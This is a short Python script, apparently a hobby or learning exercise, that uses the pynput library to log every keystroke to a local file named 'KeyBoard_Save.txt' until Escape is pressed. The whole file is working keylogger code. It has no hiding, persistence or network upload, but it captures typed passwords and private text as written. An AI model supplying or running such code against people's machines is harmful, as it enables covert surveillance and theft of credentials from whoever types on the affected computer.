#print('This is the main file')

#Start from scratch

from pynput import keyboard
from pynput.keyboard import Listener

Stroke = None

storage = open('KeyBoard_Save.txt', 'a')
def record_click(key):
    global Stroke  # Declare that we are using the global variable
    try:
        Stroke = key.char
        storage.write(Stroke)
    except AttributeError:
        storage.write(f'{key}')

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

with keyboard.Listener(on_press=record_click, on_release=on_release) as listener:
    listener.join()

storage.close()